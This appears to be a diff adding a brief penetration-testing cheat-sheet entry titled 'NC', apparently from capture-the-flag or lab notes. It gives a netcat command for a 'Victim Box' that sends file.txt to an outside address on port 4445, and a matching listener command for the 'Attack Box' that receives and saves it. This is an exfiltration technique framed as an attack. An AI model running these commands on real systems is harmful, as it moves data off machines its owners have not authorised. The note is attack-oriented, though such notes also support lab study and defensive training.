@@ -1,0 +1,11 @@
+## NC
+
+### Victim Box
+
+cd /home/user1/
+
+nc 10.10.14.120 4445 < file.txt
+
+### Attack Box
+
+nc -lvp 4445 > file.txt
